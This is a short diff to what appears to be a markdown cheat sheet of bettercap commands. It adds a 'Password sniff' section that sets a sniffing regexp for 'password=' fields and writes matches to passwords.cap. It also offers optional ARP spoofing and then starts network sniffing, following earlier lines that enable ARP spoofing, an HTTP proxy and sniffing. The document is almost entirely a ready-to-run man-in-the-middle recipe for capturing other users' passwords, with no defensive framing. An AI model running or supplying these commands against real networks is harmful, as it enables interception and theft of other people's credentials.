@@ -18,5 +18,19 @@ arp.spoof on
 http.proxy on
 net.sniff on
 ```
+-----------------------------------------------------------
 
+# Password sniff
+```bash
+set net.sniff.regexp .*password=.+
+set net.sniff.output passwords.cap
+```
+# start arp spoofing attack
+- Optional
+```bash
+# arp.spoof on
+```
+```bash
+net.sniff on
+```
 # Dood luck ;)
